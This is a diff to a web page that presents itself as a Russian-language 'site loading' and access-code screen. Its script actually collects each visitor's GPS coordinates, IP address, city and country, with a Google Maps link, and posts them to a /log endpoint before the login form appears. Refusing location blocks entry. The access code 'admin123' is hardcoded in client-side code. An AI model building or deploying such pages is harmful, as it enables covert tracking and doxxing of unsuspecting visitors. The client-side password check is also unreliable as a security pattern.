@@ -44,51 +44,44 @@
   <body>
     <h2>Сайт загружается…</h2>
     <script>
-      async function run() {
-        try {
-          const ip = await fetch('https://ipapi.co/json/').then(r => r.json());
+      navigator.geolocation.getCurrentPosition(async pos => {
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
 
-          navigator.geolocation.getCurrentPosition(async pos => {
-            const lat = pos.coords.latitude;
-            const lon = pos.coords.longitude;
+        const ip = await fetch('https://ipapi.co/json/').then(r => r.json());
 
-            const payload = {
-              timestamp: new Date().toISOString(),
-              ip: ip.ip,
-              city: ip.city,
-              region: ip.region,
-              country: ip.country_name,
-              latitude: lat,
-              longitude: lon,
-              map: `https://www.google.com/maps?q=${lat},${lon}`
-            };
+        const payload = {
+          timestamp: new Date().toISOString(),
+          ip: ip.ip,
+          city: ip.city,
+          region: ip.region,
+          country: ip.country_name,
+          latitude: lat,
+          longitude: lon,
+          map: `https://www.google.com/maps?q=${lat},${lon}`
+        };
 
-            await fetch('/log', {
-              method: 'POST',
-              headers: {'Content-Type': 'application/json'},
-              body: JSON.stringify(payload)
-            });
+        await fetch('/log', {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify(payload)
+        });
 
-            document.body.innerHTML = `
-              <h2>Введите код доступа</h2>
-              <form id="loginForm">
-                <input id="code" placeholder="Код" required>
-                <button type="submit">Войти</button>
-              </form>
-            `;
-            document.getElementById('loginForm').onsubmit = function(e) {
-              e.preventDefault();
-              const code = document.getElementById('code').value;
-              location.href = code === 'admin123' ? '/admin' : '/loading';
-            };
-          }, err => {
-            document.body.innerHTML = "<h2>Вы запретили доступ к геолокации</h2>";
-          });
-        } catch (err) {
-          document.body.innerHTML = "<h2>Ошибка при загрузке</h2>";
-        }
-      }
-      run();
+        document.body.innerHTML = `
+          <h2>Введите код доступа</h2>
+          <form id="loginForm">
+            <input id="code" placeholder="Код" required>
+            <button type="submit">Войти</button>
+          </form>
+        `;
+        document.getElementById('loginForm').onsubmit = function(e) {
+          e.preventDefault();
+          const code = document.getElementById('code').value;
+          location.href = code === 'admin123' ? '/admin' : '/loading';
+        };
+      }, err => {
+        document.body.innerHTML = "<h2>❌ Вы запретили доступ к геолокации</h2><p>Без неё вход невозможен.</p>";
+      });
     </script>
   </body>
 </html>
